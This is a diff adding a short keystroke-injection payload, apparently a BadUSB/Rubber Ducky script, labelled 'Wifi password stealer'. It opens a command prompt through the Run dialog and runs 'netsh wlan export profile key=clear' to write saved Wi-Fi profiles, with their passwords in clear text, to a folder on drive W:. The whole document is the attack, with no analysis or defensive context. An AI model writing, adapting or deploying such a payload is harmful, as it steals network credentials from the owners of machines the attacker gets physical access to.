@@ -1,0 +1,14 @@
+REM Wifi password stealer
+DELAY 100
+GUI r
+DELAY 100
+ALTSTRING cmd
+ENTER
+DELAY 1000
+ALTSTRING cd %temp%
+ENTER
+DELAY 1000
+REM exports the wifi passwords as XML
+ALTSTRING netsh wlan export profile key=clear folder=W:\pwsteal
+ENTER
+DELAY 1000
